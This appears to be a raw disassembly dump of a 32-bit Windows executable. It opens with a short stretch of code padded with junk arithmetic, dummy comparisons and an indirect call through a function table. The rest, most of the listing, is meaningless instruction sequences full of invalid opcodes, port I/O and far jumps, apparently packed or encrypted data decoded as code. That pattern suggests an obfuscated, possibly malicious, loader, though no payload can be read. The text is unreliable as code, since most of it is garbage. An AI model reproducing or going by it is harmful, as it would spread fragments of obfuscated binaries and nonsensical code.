  4027d5:	add    ecx,eax
  4027d7:	mov    DWORD PTR ds:0x422008,0x50f1
  4027e1:	cmp    esi,ecx
  4027e3:	jne    0x404d01
  4027e9:	add    DWORD PTR ds:0x420f9c,0x56b8
  4027f3:	push   DWORD PTR [ebp+0x8]
  4027f6:	call   0x40233b
  4027fb:	mov    DWORD PTR [ebp-0x18],eax
  4027fe:	mov    eax,DWORD PTR [ebp-0x4]
  402801:	xor    edi,edi
  402803:	xor    edi,DWORD PTR ds:0x420eb6
  402809:	xor    ecx,ecx
  40280b:	add    ecx,DWORD PTR ds:0x423014
  402811:	sub    edi,ecx
  402813:	or     edi,DWORD PTR [edi+ecx*1]
  402816:	mov    ecx,DWORD PTR [ebp-0x18]
  402819:	add    edi,DWORD PTR ds:0x420e9a
  40281f:	xor    eax,ebx
  402821:	mov    edi,0x3272dd
  402826:	add    eax,edi
  402828:	mov    DWORD PTR ds:0x422004,0x6f95
  402832:	cmp    ecx,eax
  402834:	mov    DWORD PTR ds:0x420e96,0x4ad4
  40283e:	je     0x404e26
  402844:	add    DWORD PTR ds:0x420e8a,0x2aaf
  40284e:	push   DWORD PTR [ebp-0x18]
  402851:	push   DWORD PTR [ebp+0x8]
  402854:	neg    DWORD PTR ds:0x420f70
  40285a:	call   0x410a1b
  40285f:	and    DWORD PTR ds:0x420eec,0x0
  402869:	mov    ecx,DWORD PTR ds:0x420eec
  40286f:	inc    ecx
  402870:	mov    DWORD PTR ds:0x420eec,ecx
  402876:	cmp    DWORD PTR ds:0x420eec,0x7
  40287d:	jne    0x402893
  402883:	push   0x4240e4
  402888:	push   0x424143
  40288d:	call   DWORD PTR ds:0x4247dd
  402893:	cmp    DWORD PTR ds:0x420eec,0x6
  40289a:	jne    0x4028ad
  4028a0:	mov    ecx,DWORD PTR ds:0x420eec
  4028a6:	inc    ecx
  4028a7:	mov    DWORD PTR ds:0x420eec,ecx
  4028ad:	cmp    DWORD PTR ds:0x420eec,0x11
  4028b4:	jb     0x402869
  4028ba:	xor    DWORD PTR ds:0x420f00,edx
  4028c0:	mov    DWORD PTR [ebp-0x18],eax
  4028c3:	adc    ecx,DWORD PTR ds:0x420ef8
  4028c9:	jmp    0x404c56
  4028ce:	rcr    DWORD PTR [ecx-0x1e],cl
  4028d1:	mov    fs,esp
  4028d3:	jno    0x402950
  4028d5:	sti    
  4028d6:	inc    esi
  4028d7:	scas   eax,DWORD PTR es:[edi]
  4028d8:	dec    ebx
  4028d9:	imul   eax,DWORD PTR [esi+0x7afb2426],0xa7a7a7a
  4028e3:	pop    edi
  4028e4:	jp     0x402960
  4028e6:	adc    eax,0x1921172c
  4028eb:	and    eax,0x36652f1b
  4028f0:	imul   esp,DWORD PTR [esi+0x5],0x6d6a6a61
  4028f7:	xor    al,ch
  4028f9:	fsubr  st(1),st
  4028fb:	push   eax
  4028fc:	dec    eax
  4028fd:	imul   esp,DWORD PTR [ecx+0x5b],0xffffff90
  402901:	pusha  
  402902:	ins    DWORD PTR es:[edi],dx
  402903:	pop    ecx
  402904:	iret   
  402905:	pop    ebp
  402906:	dec    edx
  402907:	and    BYTE PTR [edx+edi*8+0x4d577687],cl
  40290e:	jg     0x402947
  402910:	jo     0x4028b8
  402912:	jg     0x4028b4
  402914:	mov    ds:0x66ff2c3b,al
  402919:	fdiv   st(2),st
  40291b:	push   ebx
  40291c:	jg     0x40293c
  40291e:	in     eax,dx
  40291f:	cmp    ebp,ecx
  402921:	mov    edx,0xde1387ed
  402926:	mov    ebp,DWORD PTR [ecx]
  402928:	mulps  xmm5,XMMWORD PTR [ebx+0x6df7c48a]
  40292f:	fld    QWORD PTR [esp+edx*8]
  402932:	push   cs
  402933:	cli    
  402934:	sbb    BYTE PTR es:[eax+0xc],cl
  402938:	imul   ebp,DWORD PTR es:[eax-0x47],0xffffffaf
  40293d:	adc    eax,DWORD PTR [ecx+0x5]
  402940:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402941:	(bad)  
  402942:	jmp    0x32b45490
  402947:	enter  0xf95b,0x1a
  40294b:	cli    
  40294c:	js     0x4028ef
  40294e:	arpl   bp,bx
  402950:	cwde   
  402951:	pop    edi
  402952:	mov    esp,DWORD PTR [ecx+0x31821407]
  402958:	repz sahf 
  40295a:	cmp    al,0x72
  40295c:	jae    0x402969
  40295e:	fisubr DWORD PTR ds:0x33348d52
  402964:	push   esp
  402965:	jecxz  0x402936
  402967:	mov    ch,BYTE PTR [ecx]
  402969:	mov    DWORD PTR [eax+0x5188ccb7],esi
  40296f:	in     al,0x45
  402971:	push   edx
  402972:	dec    esp
  402973:	or     al,0x3e
  402975:	repz add ebp,DWORD PTR ss:[ebp+0x30a7ca4b]
  40297d:	rol    BYTE PTR [esi+edx*2],0xfd
  402981:	push   edx
  402982:	push   esi
  402983:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402984:	stc    
  402985:	push   0x1e42f8bf
  40298a:	int3   
  40298b:	jne    0x402a0a
  40298d:	aas    
  40298e:	pop    ebp
  40298f:	std    
  402990:	out    dx,eax
  402991:	cwde   
  402992:	test   DWORD PTR [edi-0x70],ecx
  402995:	aaa    
  402996:	mov    ecx,0xd7faf202
  40299b:	add    al,0xa1
  40299d:	adc    cl,BYTE PTR [edi-0x70]
  4029a0:	jno    0x402973
  4029a2:	ja     0x402928
  4029a4:	mov    ebx,0x33429fc4
  4029a9:	idiv   DWORD PTR [eax]
  4029ab:	sbb    al,0x90
  4029ad:	xchg   BYTE PTR [ecx],bl
  4029af:	and    bh,bl
  4029b1:	clc    
  4029b2:	je     0x402a25
  4029b4:	add    eax,0x4b3016d0
  4029b9:	test   al,0x4a
  4029bb:	lahf   
  4029bc:	or     al,ah
  4029be:	mov    ebx,DWORD PTR [ecx]
  4029c0:	ja     0x402a38
  4029c2:	lahf   
  4029c3:	mov    ds:0x69c765d1,al
  4029c8:	clc    
  4029c9:	lods   al,BYTE PTR ds:[esi]
  4029ca:	dec    ebx
  4029cb:	cld    
  4029cc:	cmp    al,0x25
  4029ce:	lods   eax,DWORD PTR ds:[esi]
  4029cf:	sub    ah,BYTE PTR [ebx+eiz*2]
  4029d2:	xchg   edx,eax
  4029d3:	jmp    0xba7d5f00
  4029d8:	mov    ds:0x540ca7ef,al
  4029dd:	outs   dx,BYTE PTR ds:[esi]
  4029de:	cmp    eax,0x1d111d6c
  4029e3:	scas   al,BYTE PTR es:[edi]
  4029e4:	or     DWORD PTR ds:0xe9895fc6,esp
  4029ea:	push   eax
  4029eb:	lods   al,BYTE PTR ds:[esi]
  4029ec:	test   DWORD PTR [ecx],esi
  4029ee:	add    ch,0x65
  4029f1:	push   es
  4029f2:	add    esi,DWORD PTR [esi]
  4029f4:	pop    edi
  4029f5:	add    DWORD PTR [esi],ebx
  4029f7:	pop    esi
  4029f8:	out    0xbd,al
  4029fa:	add    cl,BYTE PTR [ebx+0x1]
  4029fd:	je     0x402988
  4029ff:	jp     0x402a47
  402a01:	adc    cl,ch
  402a03:	imul   ebp,DWORD PTR [eax],0xffffffc3
  402a06:	imul   eax,DWORD PTR [edi+ecx*8-0x4c],0x8b082936
  402a0e:	retf   
  402a0f:	pop    esi
  402a10:	in     eax,0x8a
  402a12:	lahf   
  402a13:	jg     0x402a5f
  402a15:	popa   
  402a16:	call   0xfa321999
  402a1b:	stos   BYTE PTR es:[edi],al
  402a1c:	or     ebx,edi
  402a1e:	fcmovnu st,st(3)
  402a20:	loop   0x402a32
  402a22:	xor    edi,edx
  402a24:	pop    esp
  402a25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a26:	mov    ah,0x80
  402a28:	fild   WORD PTR [edx-0x2e6f19e6]
  402a2e:	fidiv  DWORD PTR [esi]
  402a30:	cmp    al,0x45
  402a32:	repnz mov al,0xfc
  402a35:	pusha  
  402a36:	popf   
  402a37:	ret    0xa8f0
  402a3a:	pop    ecx
  402a3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a3c:	addr16 dec edx
  402a3e:	jae    0x402a62
  402a40:	std    
  402a41:	dec    esp
  402a42:	aas    
  402a43:	mov    edi,0x44d5da2a
  402a48:	sbb    al,0xc3
  402a4a:	adc    bl,BYTE PTR [ebp-0x6b]
  402a4d:	jecxz  0x402a1b
  402a4f:	out    0xe6,al
  402a51:	ins    BYTE PTR es:[edi],dx
  402a52:	push   es
  402a53:	loopne 0x402a08
  402a55:	mov    esp,0xe7002343
  402a5a:	pushf  
  402a5b:	sub    bh,bh
  402a5d:	xchg   BYTE PTR [esi-0x29],ah
  402a60:	mov    eax,ds:0xbf4a4b38
  402a65:	test   bl,bh
  402a67:	js     0x4029f7
  402a69:	or     edi,DWORD PTR [ebx]
  402a6b:	mov    WORD PTR [edx+0xdb6dd23],?
  402a71:	mov    bl,0xb9
  402a73:	or     ebx,DWORD PTR [edi]
  402a75:	(bad)  
  402a76:	pop    ebx
  402a77:	shl    DWORD PTR [ebp+0x3e],0xcf
  402a7b:	add    cl,BYTE PTR [eax+0x3]
  402a7e:	arpl   WORD PTR [eax+0x6ea925a3],bp
  402a84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a85:	popa   
  402a86:	push   ebp
  402a87:	push   es
  402a88:	lock or eax,0x4db5f6c5
  402a8e:	push   esi
  402a8f:	lods   al,BYTE PTR ds:[esi]
  402a90:	and    BYTE PTR ds:0x9235375f,bh
  402a96:	and    DWORD PTR [esi+eax*1-0x5e32afe1],0x32cdbac1
  402aa1:	xor    ah,bh
  402aa3:	add    esp,DWORD PTR [ebp-0x45]
  402aa6:	pop    eax
  402aa7:	(bad)  
  402aa8:	out    0xc4,al
  402aaa:	mov    ebp,0x27fc23b2
  402aaf:	or     eax,0x8d1ecdb7
  402ab4:	nop
  402ab5:	fidiv  WORD PTR [esi+0x447de214]
  402abb:	cli    
  402abc:	(bad)  
  402abd:	shl    DWORD PTR [edx+ebp*1+0x3d1a2938],1
  402ac4:	xchg   edi,eax
  402ac5:	mov    esi,0xf7aefe13
  402aca:	retf   
  402acb:	popf   
  402acc:	jle    0x402ad5
  402ace:	test   ebx,ebp
  402ad0:	push   0x4088937e
  402ad5:	push   ss
  402ad6:	sti    
  402ad7:	inc    eax
  402ad8:	jnp    0x402a9b
  402ada:	inc    ebx
  402adb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402adc:	shr    BYTE PTR [eax-0x76],0x2b
  402ae0:	inc    esp
  402ae1:	xchg   BYTE PTR [eax+ebp*1-0x3e1f555],cl
  402ae8:	fsub   DWORD PTR [eax-0x1f]
  402aeb:	jl     0x402abf
  402aed:	pop    ebx
  402aee:	fcmove st,st(1)
  402af0:	sbb    eax,0x6b3b508f
  402af5:	adc    ch,BYTE PTR [edi]
  402af7:	cmp    eax,0xd039f71d
  402afc:	aam    0xa0
  402afe:	push   ss
  402aff:	lods   al,BYTE PTR ds:[esi]
  402b00:	fidivr WORD PTR [eax-0x7cb3d63c]
  402b06:	xchg   edi,eax
  402b07:	aad    0xdb
  402b09:	mov    es,WORD PTR [edi-0x60abb35b]
  402b0f:	(bad)  
  402b10:	jg     0x402ab8
  402b12:	dec    edi
  402b13:	sbb    eax,0x69054684
  402b18:	test   edx,0xff2be3c8
  402b1e:	and    al,0x89
  402b20:	jae    0x402ada
  402b22:	sbb    dh,BYTE PTR [ebx+edx*1]
  402b25:	clc    
  402b26:	lock pusha 
  402b28:	arpl   cx,dx
  402b2a:	or     DWORD PTR [ebx+ecx*1-0x6426f530],eax
  402b31:	(bad)  
  402b32:	sbb    eax,0x54f2090e
  402b37:	enter  0x3e91,0xb1
  402b3b:	pusha  
  402b3c:	push   cs
  402b3d:	mov    edx,0xd64e8d61
  402b42:	imul   edx
  402b44:	adc    edx,DWORD PTR [ebp-0x65ca0de0]
  402b4a:	(bad)  
  402b4b:	mov    esi,0x22abbb3f
  402b50:	pop    ecx
  402b51:	inc    esp
  402b52:	add    eax,DWORD PTR [eax-0x5123848a]
  402b58:	(bad)  
  402b59:	mov    ds:0x67e74219,al
  402b5e:	sar    DWORD PTR [esi],0x10
  402b61:	mov    ebp,0x9068a4d5
  402b66:	adc    BYTE PTR [eax-0x54908a62],dl
  402b6c:	mov    dl,BYTE PTR [eax+0x6b3db418]
  402b72:	inc    esp
  402b73:	mov    edi,0x79fecaae
  402b78:	push   eax
  402b79:	xor    eax,0xd31425f5
  402b7e:	ins    DWORD PTR es:[edi],dx
  402b7f:	pusha  
  402b80:	xchg   ecx,eax
  402b81:	loope  0x402bb3
  402b83:	clc    
  402b84:	mov    WORD PTR [ecx+ecx*2-0x22],?
  402b88:	sub    eax,0xf1c1dd35
  402b8d:	jb     0x402b6e
  402b8f:	repnz xor ch,BYTE PTR [edx+eiz*8-0x211d1e39]
  402b97:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  402b99:	push   ebp
  402b9a:	outs   dx,BYTE PTR ds:[esi]
  402b9b:	or     edx,DWORD PTR [ecx-0x11f1f1e5]
  402ba1:	aas    
  402ba2:	test   ebp,esp
  402ba4:	push   es
  402ba5:	add    ah,ch
  402ba7:	xchg   esp,eax
  402ba8:	xchg   esp,eax
  402ba9:	in     eax,dx
  402baa:	fsubr  DWORD PTR [esi+0x42a87b29]
  402bb0:	or     al,0x74
  402bb2:	ret    
  402bb3:	test   DWORD PTR [eax-0x80],esi
  402bb6:	sbb    esp,ebx
  402bb8:	into   
  402bb9:	repnz or ch,BYTE PTR [ebx]
  402bbc:	hlt    
  402bbd:	cmp    al,0xfa
  402bbf:	jmp    0x402b5a
  402bc1:	fsubr  QWORD PTR [eax+0x4ae56a97]
  402bc7:	sub    al,0xf1
  402bc9:	leave  
  402bca:	mov    BYTE PTR [ecx+ebx*8-0x7e],0x5a
  402bcf:	and    DWORD PTR [ecx+0x3b49d8bc],0xfffffffd
  402bd6:	das    
  402bd7:	retf   0xd5dc
  402bda:	inc    DWORD PTR [ebx]
  402bdc:	or     BYTE PTR [esp+eax*4+0x27],bh
  402be0:	out    dx,eax
  402be1:	inc    ebx
  402be2:	mov    esi,0x75d2b17e
  402be7:	lods   eax,DWORD PTR ds:[esi]
  402be8:	xor    dl,bl
  402bea:	sub    ah,BYTE PTR [eax+0x1949c79b]
  402bf0:	pop    esi
  402bf1:	sar    bl,cl
  402bf3:	mov    dl,ch
  402bf5:	mov    ebx,0xf9e7bc2a
  402bfa:	repz adc eax,0x9de37406
  402c00:	int    0xfd
  402c02:	fild   WORD PTR ds:[ecx+0x4b]
  402c06:	cmp    dh,0xd6
  402c09:	xor    eax,0xbf73a04f
  402c0e:	popf   
  402c0f:	jle    0x402bc4
  402c11:	push   ebx
  402c12:	jp     0x402b9c
  402c14:	inc    edi
  402c15:	pop    ds
  402c16:	fisubr DWORD PTR [ecx+ebp*4-0x7cc17d1f]
  402c1d:	mov    bh,0x92
  402c1f:	cs mov esi,0x9bfa8c92
  402c25:	xchg   esi,eax
  402c26:	out    dx,eax
  402c27:	add    DWORD PTR [esi-0x39757756],esp
  402c2d:	mov    ebp,0x852deeb6
  402c32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402c33:	in     eax,dx
  402c34:	fs xchg ebp,eax
  402c36:	cmp    al,ch
  402c38:	mov    bl,0x99
  402c3a:	loope  0x402c99
  402c3c:	xacquire xchg DWORD PTR [eax-0x14],ebp
  402c40:	js     0x402c74
  402c42:	loope  0x402c9d
  402c44:	repz aas 
  402c46:	sbb    eax,0x9edc2ba7
  402c4b:	inc    esi
  402c4c:	pop    edx
  402c4d:	cmp    eax,0xe1b0a8c5
  402c52:	loopne 0x402bf6
  402c54:	es loope 0x402ca4
  402c57:	pop    edi
  402c58:	fwait
  402c59:	mov    dh,0xa
  402c5b:	pop    esp
  402c5c:	mov    BYTE PTR [edi+0x5d82aa48],bl
  402c62:	and    DWORD PTR [eax],esi
  402c64:	push   ds
  402c65:	dec    edx
  402c66:	cmp    esp,ecx
  402c68:	clc    
  402c69:	xchg   edx,eax
  402c6a:	bound  eax,QWORD PTR [edx+0x49890e60]
  402c70:	xchg   ecx,eax
  402c71:	sahf   
  402c72:	pop    bx
  402c74:	call   0xa2f1edc7
  402c79:	push   es
  402c7a:	lods   al,BYTE PTR ds:[si]
  402c7c:	xor    al,0x5b
  402c7e:	xchg   ebp,eax
  402c7f:	lds    eax,FWORD PTR [ebp+0x10]
  402c82:	fs iret 
  402c84:	pop    ebp
  402c85:	sbb    ebp,esi
  402c87:	frstor [ecx]
  402c89:	or     ebx,esi
  402c8b:	shr    DWORD PTR [ebx-0x3956078b],1
  402c91:	mov    ch,0x7d
  402c93:	dec    esi
  402c94:	test   DWORD PTR [edx+0x888772],esi
  402c9a:	bound  ebp,QWORD PTR [ebx-0x41]
  402c9d:	pop    esp
  402c9e:	cs pop ss
  402ca0:	call   0x5ac8440d
  402ca5:	inc    ecx
  402ca6:	dec    esp
  402ca7:	in     eax,0x69
  402ca9:	xchg   edx,eax
  402caa:	lods   al,BYTE PTR ds:[esi]
  402cab:	push   esi
  402cac:	sub    bh,BYTE PTR [esi-0x51]
  402caf:	and    BYTE PTR [edi],cl
  402cb1:	test   al,0xef
  402cb3:	xor    eax,0x88c40f7d
  402cb8:	add    eax,0xea169a30
  402cbd:	lds    edi,FWORD PTR [ebx-0x69]
  402cc0:	jbe    0x402d33
  402cc2:	imul   edx,ebx,0x42
  402cc5:	pmaxsw mm3,QWORD PTR [ebx]
  402cc8:	in     al,dx
  402cc9:	rol    ch,0x12
  402ccc:	jmp    0x402cef
  402cce:	retf   0x7925
  402cd1:	push   0xa
  402cd3:	sub    ah,ch
  402cd5:	adc    esp,ecx
  402cd7:	pop    es
  402cd8:	sbb    al,0x4a
  402cda:	loopne 0x402c99
  402cdc:	cmp    ebx,DWORD PTR [ecx+0x6e6d3972]
  402ce2:	test   eax,0xdf8a8750
  402ce7:	sub    ebx,DWORD PTR [eax-0x1f]
  402cea:	push   ds
  402ceb:	mov    ebp,0xeff4de45
  402cf0:	xchg   edi,eax
  402cf1:	aas    
  402cf2:	pop    es
  402cf3:	add    eax,0x5d151362
  402cf8:	mov    eax,0xd62ab9c6
  402cfd:	cwde   
  402cfe:	mov    WORD PTR [ebp-0x37],?
  402d01:	cmp    al,0x50
  402d03:	in     al,dx
  402d04:	sbb    dl,dl
  402d06:	ins    BYTE PTR es:[edi],dx
  402d07:	sub    al,0x39
  402d09:	and    BYTE PTR [edi+eiz*1+0x6a5e38a5],al
  402d10:	aam    0x95
  402d12:	mov    ds:0xa55beb4b,eax
  402d17:	scas   eax,DWORD PTR es:[di]
  402d19:	mov    ch,0x12
  402d1b:	push   edi
  402d1c:	inc    ebx
  402d1d:	cmp    eax,0x403695e5
  402d22:	mov    dl,BYTE PTR [edi+0x7c91ead7]
  402d28:	int3   
  402d29:	cmp    DWORD PTR [ebx-0x11fcad11],esi
  402d2f:	out    0x1c,eax
  402d31:	push   esi
  402d32:	inc    esi
  402d33:	shl    cl,0x9b
  402d36:	mov    ch,0x94
  402d38:	imul   esi,DWORD PTR [esi],0xffffffd6
  402d3b:	dec    eax
  402d3c:	pop    eax
  402d3d:	nop
  402d3e:	mov    edi,0xe2ee3eaf
  402d43:	in     al,0x84
  402d45:	mov    esp,0xbf40bcfc
  402d4a:	int    0x23
  402d4c:	jmp    DWORD PTR [esi]
  402d4e:	in     al,0xe3
  402d50:	clc    
  402d51:	xchg   ecx,eax
  402d52:	xor    ebx,ebp
  402d54:	ret    0x4c3c
  402d57:	out    0xcc,al
  402d59:	out    0x7b,al
  402d5b:	dec    esi
  402d5c:	add    eax,DWORD PTR [ecx-0x2f]
  402d5f:	loopne 0x402d61
  402d61:	mov    ds:0xe016c605,al
  402d66:	adc    ch,BYTE PTR [ebx-0x6cc5bcc2]
  402d6c:	sar    DWORD PTR [eax-0x43530169],cl
  402d72:	mov    al,0x39
  402d74:	sub    eax,0x1c1a43a6
  402d79:	daa    
  402d7a:	inc    edx
  402d7b:	xor    al,0xbe
  402d7d:	jns    0x402d58
  402d7f:	daa    
  402d80:	pop    esp
  402d81:	icebp  
  402d82:	pop    ebx
  402d83:	fcom   DWORD PTR [esi]
  402d85:	inc    ebx
  402d86:	xchg   ecx,eax
  402d87:	xchg   edi,eax
  402d88:	leave  
  402d89:	into   
  402d8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d8b:	adc    DWORD PTR [edx-0x3ae4f11d],0x33adc9c9
  402d95:	fld    TBYTE PTR [ecx+0x61]
  402d98:	dec    esp
  402d99:	clc    
  402d9a:	push   ds
  402d9b:	out    0xaa,al
  402d9d:	imul   edx,DWORD PTR [ecx],0xa9391b4f
  402da3:	mov    cl,0x1b
  402da5:	pop    eax
  402da6:	int    0x8a
  402da8:	push   0xd02559b0
  402dad:	adc    DWORD PTR [edx],0xffffff92
  402db0:	retf   
  402db1:	sbb    ebp,eax
  402db3:	bound  eax,QWORD PTR ds:0x847b5d0c
  402db9:	push   es
  402dba:	pop    ss
  402dbb:	loop   0x402d70
  402dbd:	mov    ds:0xd95eeee6,eax
  402dc2:	xchg   esp,eax
  402dc3:	sbb    eax,0x9459c886
  402dc8:	jnp    0x402dde
  402dca:	int3   
  402dcb:	adc    al,bh
  402dcd:	mov    ecx,0x9d22e695
  402dd2:	pop    ds
  402dd3:	into   
  402dd4:	scas   al,BYTE PTR es:[edi]
  402dd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402dd6:	cwde   
  402dd7:	mov    ah,0xf9
  402dd9:	and    eax,0x855bef3b
  402dde:	adc    edx,DWORD PTR [ebp+0x16]
  402de1:	stos   DWORD PTR es:[edi],eax
  402de2:	repnz lds eax,FWORD PTR [eax+0x283e16bc]
  402de9:	sbb    edi,DWORD PTR ds:0x1feee929
  402def:	mov    esi,0xc27cec4a
  402df4:	stos   BYTE PTR es:[edi],al
  402df5:	xchg   edi,eax
  402df6:	js     0x402e2c
  402df8:	das    
  402df9:	nop
  402dfa:	outs   dx,DWORD PTR ds:[esi]
  402dfb:	cwde   
  402dfc:	pop    edx
  402dfd:	(bad)  
  402dfe:	jg     0x402e3b
  402e00:	outs   dx,DWORD PTR ds:[esi]
  402e01:	or     edi,DWORD PTR [edi]
  402e03:	or     DWORD PTR [ebx],ebp
  402e05:	xor    al,BYTE PTR [edx+0x2902ceff]
  402e0b:	mov    ds:0x4c95ebe6,al
  402e10:	lahf   
  402e11:	out    0x6,eax
  402e13:	mov    eax,0xd4ec5198
  402e18:	aad    0x8a
  402e1a:	loope  0x402dde
  402e1c:	mov    ecx,0x7f2c9948
  402e21:	(bad)  
  402e23:	int    0x60
  402e25:	inc    edx
  402e26:	sbb    ch,dh
  402e28:	add    eax,0xe5f263b6
  402e2d:	xor    DWORD PTR [esi+0x22],ebp
  402e30:	imul   esp,esp,0x10f2865
  402e36:	dec    edi
  402e37:	(bad)  
  402e38:	or     ebx,DWORD PTR [esi]
  402e3a:	cld    
  402e3b:	xchg   ecx,eax
  402e3c:	ret    0x76c4
  402e3f:	xchg   esp,eax
  402e40:	aas    
  402e41:	fsub   QWORD PTR [eax-0x6b]
  402e44:	nop
  402e45:	and    cl,BYTE PTR [esi-0x2919ac60]
  402e4b:	push   edi
  402e4c:	and    al,0x87
  402e4e:	mov    ah,0x5a
  402e50:	ins    BYTE PTR es:[edi],dx
  402e51:	adc    al,0xce
  402e53:	push   edx
  402e54:	pop    esi
  402e55:	clc    
  402e56:	aaa    
  402e57:	and    BYTE PTR [esi],al
  402e59:	push   es
  402e5a:	dec    ebx
  402e5b:	fidivr WORD PTR [eax]
  402e5d:	hlt    
  402e5e:	repz das 
  402e60:	xchg   DWORD PTR [ecx+0x75],ebx
  402e63:	leave  
  402e64:	ret    
  402e65:	out    0xcc,al
  402e67:	adc    BYTE PTR [edx+0x3db83d5c],bl
  402e6d:	xchg   ebp,eax
  402e6e:	stos   DWORD PTR es:[edi],eax
  402e6f:	sbb    DWORD PTR [eax+0x4c],edx
  402e72:	sbb    bl,BYTE PTR [ebx-0x21]
  402e75:	in     eax,dx
  402e76:	iret   
  402e77:	inc    ebx
  402e78:	es jbe 0x402e04
  402e7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e7c:	shl    DWORD PTR [edx+0x4],1
  402e7f:	and    esi,esi
  402e81:	leave  
  402e82:	in     eax,dx
  402e83:	lods   al,BYTE PTR ds:[esi]
  402e84:	out    0x5b,eax
  402e86:	mov    cl,0x36
  402e88:	xchg   ebx,eax
  402e89:	mov    WORD PTR [ebp+0x3e],es
  402e8c:	ins    DWORD PTR es:[edi],dx
  402e8d:	xchg   esi,eax
  402e8e:	outs   dx,DWORD PTR ds:[esi]
  402e8f:	in     eax,0x82
  402e91:	cmp    eax,DWORD PTR [esi-0x50]
  402e94:	pop    edx
  402e95:	push   cs
  402e96:	push   ecx
  402e97:	outs   dx,DWORD PTR ds:[esi]
  402e98:	jle    0x402e1c
  402e9a:	xor    DWORD PTR [eax+eax*1+0x7115fbaf],ebx
  402ea1:	or     ch,BYTE PTR [eax+0x33]
  402ea4:	sub    ebp,DWORD PTR [edx+0x7c239c5d]
  402eaa:	jl     0x402f04
  402eac:	fs shl ebx,cl
  402eaf:	xchg   ebx,eax
  402eb0:	push   ds
  402eb1:	mov    WORD PTR [ebp+0x41],gs
  402eb4:	test   al,0xbd
  402eb6:	rcr    BYTE PTR [ebx+0x73eb698c],1
  402ebc:	or     BYTE PTR [edx+0x6],bh
  402ebf:	sub    al,0xb0
  402ec1:	adc    eax,0x120f29b1
  402ec6:	out    0x0,al
  402ec8:	test   DWORD PTR [edi-0xe],eax
  402ecb:	and    dh,al
  402ecd:	ja     0x402e6a
  402ecf:	shl    DWORD PTR [esi+0x2d],cl
  402ed2:	fadd   DWORD PTR [eax-0x57]
  402ed5:	jmp    0xf14:0x77fed96a
  402edc:	jmp    0x402ede
  402ede:	sbb    DWORD PTR [eax+0x1e98dca6],esp
  402ee4:	int    0x6c
  402ee6:	psrad  mm7,QWORD PTR [edi-0x2d]
  402eea:	bswap  esi
  402eec:	int3   
  402eed:	lea    edi,[esi]
  402eef:	jne    0x402f3c
  402ef1:	mov    esi,0x9a649b5
  402ef6:	cli    
  402ef7:	inc    ecx
  402ef8:	in     al,dx
  402ef9:	sub    DWORD PTR [esi+0x67],edi
  402efc:	xchg   edx,eax
  402efd:	in     al,0x2d
  402eff:	sahf   
  402f00:	aam    0x91
  402f02:	pushf  
  402f03:	dec    edi
  402f04:	add    BYTE PTR [edx+0x3b],cl
  402f07:	lahf   
  402f08:	fcomp  DWORD PTR [ebx]
  402f0a:	pop    esi
  402f0b:	jmp    0x31ab:0xf6777dd9
  402f12:	les    esp,FWORD PTR [ebp+0x33]
  402f15:	sbb    DWORD PTR [edx-0x2],ebp
  402f18:	xchg   esp,eax
  402f19:	mov    dl,0x87
  402f1b:	inc    ebx
  402f1c:	lods   eax,DWORD PTR ds:[esi]
  402f1d:	shr    DWORD PTR [edx],cl
  402f1f:	jae    0x402ea6
  402f21:	or     edx,DWORD PTR [esi]
  402f23:	ja     0x402f11
  402f25:	ins    DWORD PTR es:[edi],dx
  402f26:	iret   
  402f27:	enter  0x8058,0xe3
  402f2b:	push   0x1d
  402f2d:	lds    esp,FWORD PTR [ecx+0x5c89d462]
  402f33:	sub    BYTE PTR [ebx],0xe4
  402f36:	in     eax,dx
  402f37:	lock idiv esi
  402f3a:	xchg   ebp,eax
  402f3b:	nop
  402f3c:	(bad)  [edi+0x67]
  402f3f:	inc    ebp
  402f40:	dec    ebx
  402f41:	push   ss
  402f42:	cld    
  402f43:	inc    ebx
  402f44:	call   0x5a3d3c37
  402f49:	(bad)  
  402f4a:	xor    DWORD PTR ss:[ecx-0x68],0xffffffe0
  402f4f:	jl     0x402fae
  402f51:	push   esp
  402f52:	jns    0x402fae
  402f54:	sahf   
  402f55:	inc    eax
  402f56:	std    
  402f57:	add    DWORD PTR [esi+0x58e9f6cb],eax
  402f5d:	jns    0x402f5b
  402f5f:	enter  0x43b5,0xaa
  402f63:	sub    edi,DWORD PTR [ebp+0x7bd8cae4]
  402f69:	dec    ebp
  402f6a:	add    eax,0x99d593cb
  402f6f:	in     eax,0x48
  402f71:	push   ebp
  402f72:	addps  xmm3,XMMWORD PTR [ecx+0x41c8c617]
  402f79:	cmp    edx,edx
  402f7b:	in     eax,dx
  402f7c:	pop    esp
  402f7d:	mov    esp,0x35210357
  402f82:	popa   
  402f83:	test   eax,0x4fe0f48f
  402f88:	int    0xf9
  402f8a:	es mov edx,0x4118caea
  402f90:	sub    ebx,DWORD PTR [eax+0x58]
  402f93:	loopne 0x402f7a
  402f95:	sub    eax,0xe633a27a
  402f9a:	(bad)  
  402f9b:	in     eax,dx
  402f9c:	push   ebx
  402f9d:	mov    BYTE PTR [edx+0x16741fb9],bh
  402fa3:	push   ss
  402fa4:	push   ebx
  402fa5:	jp     0x402f8d
  402fa7:	sbb    BYTE PTR [eax],cl
  402fa9:	xchg   ecx,eax
  402faa:	pushf  
  402fab:	stos   BYTE PTR es:[edi],al
  402fac:	xchg   BYTE PTR [eax+0x4caf366d],cl
  402fb2:	inc    eax
  402fb3:	in     eax,dx
  402fb4:	mov    edi,0xf271fa66
  402fb9:	lahf   
  402fba:	call   0x9d09:0xed648558
  402fc1:	add    ah,cl
  402fc3:	(bad)  
  402fc4:	nop
  402fc5:	mov    ds:0xcf42a5c2,al
  402fca:	inc    esi
  402fcb:	fwait
  402fcc:	int3   
  402fcd:	push   ecx
  402fce:	inc    eax
  402fcf:	xor    eax,0xaedbaaa7
  402fd4:	cdq    
  402fd5:	loopne 0x402fd2
  402fd7:	enter  0xa7fb,0xa8
  402fdb:	test   bh,bh
  402fdd:	add    esp,eax
